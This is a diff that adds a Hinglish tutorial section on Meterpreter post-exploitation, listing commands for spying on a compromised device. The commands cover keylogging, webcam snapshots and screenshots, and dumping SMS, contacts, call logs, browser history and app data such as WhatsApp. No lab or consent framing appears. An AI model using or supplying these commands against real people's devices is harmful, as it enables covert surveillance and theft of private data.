@@ -200,3 +200,85 @@ Ab jab tum Meterpreter session me ho, toh tum kai commands use kar sakte ho targ
    exit
    ```
 
+<hr>
+
+Meterpreter sessions ke through tum bohot saari functionalities access kar sakte ho. Yahan par main kuch common sessions aur commands ki list de raha hoon jo tum use kar sakte ho:
+
+### Meterpreter Sessions Aur Unki Functionalities
+
+1. **System Information**
+   - **Command**: `sysinfo`
+   - **Description**: Target system ki basic information jaisi ki OS version, architecture, aur hostname dekho.
+
+2. **File System Navigation**
+   - **Command**: `ls`
+   - **Description**: Current directory ke contents list karo.
+   - **Command**: `cd <directory>`
+   - **Description**: Directory change karo.
+
+3. **File Downloading**
+   - **Command**: `download <filename>`
+   - **Description**: Target device se specific file ko apne machine par download karo.
+
+4. **File Uploading**
+   - **Command**: `upload <local_file_path>`
+   - **Description**: Apni machine se target device par file upload karo.
+
+5. **Running Commands**
+   - **Command**: `execute -f <command>`
+   - **Description**: Target device par koi bhi command execute karo.
+
+6. **Screen Capture**
+   - **Command**: `screenshot`
+   - **Description**: Target device ki current screen ka screenshot lo.
+
+7. **Camera Access**
+   - **Command**: `webcam_snap`
+   - **Description**: Target device ki webcam se ek snapshot lo.
+
+8. **Keylogging**
+   - **Command**: `keyscan_start`
+   - **Description**: Keylogger start karo taaki tum target device par type kiye gaye keys dekh sako.
+   - **Command**: `keyscan_dump`
+   - **Description**: Keylog kiye gaye keys dekho.
+   - **Command**: `keyscan_stop`
+   - **Description**: Keylogger ko stop karo.
+
+9. **SMS Access**
+   - **Command**: `dump_sms`
+   - **Description**: Target device se SMS logs dump karo.
+
+10. **Contact Access**
+    - **Command**: `dump_contacts`
+    - **Description**: Target device ke contacts list karo.
+
+11. **Call Log Access**
+    - **Command**: `dump_calllog`
+    - **Description**: Target device ke call logs dump karo.
+
+12. **Accessing Browser History**
+    - **Command**: `dump_browser_history`
+    - **Description**: Target device ke browser history ko access karo.
+
+13. **Accessing Application Data**
+    - **Command**: `cd /data/data/<package_name>/`
+    - **Description**: Specific application ke data folder me jao (e.g., WhatsApp).
+    - **Command**: `ls`
+    - **Description**: Application data ko list karo.
+
+14. **Process Management**
+    - **Command**: `ps`
+    - **Description**: Target device par running processes ko list karo.
+    - **Command**: `kill <PID>`
+    - **Description**: Specific process ko kill karo.
+
+15. **Networking Commands**
+    - **Command**: `ipconfig`
+    - **Description**: Target device ka network configuration dekho.
+
+16. **Shutdown/Reboot**
+    - **Command**: `shutdown`
+    - **Description**: Target device ko shutdown karo.
+    - **Command**: `reboot`
+    - **Description**: Target device ko reboot karo.
+
